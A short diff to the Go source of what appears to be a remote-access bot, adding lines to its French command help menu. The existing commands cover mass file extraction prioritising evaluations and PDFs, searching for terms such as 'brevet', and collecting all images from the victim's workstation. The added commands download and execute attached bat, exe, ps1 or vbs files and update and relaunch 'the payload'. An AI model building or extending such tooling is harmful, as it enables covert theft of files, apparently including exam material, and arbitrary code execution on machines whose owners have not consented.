@@ -35,6 +35,8 @@ var helpSections = map[string]string{
 		"!files               extraction massive (évaluations et PDF d'abord)\n" +
 		"!search <motif> [n]  ex. !search eval   |  !search brevet 20\n" +
 		"!images              toutes les images du poste\n" +
+		"!exec + fichier joint  telecharge et execute (bat, exe, ps1, vbs)\n" +
+		"!new  + exe joint      met a jour le payload et relance la version\n" +
 		"```",
 
 	"capture": "```\n" +
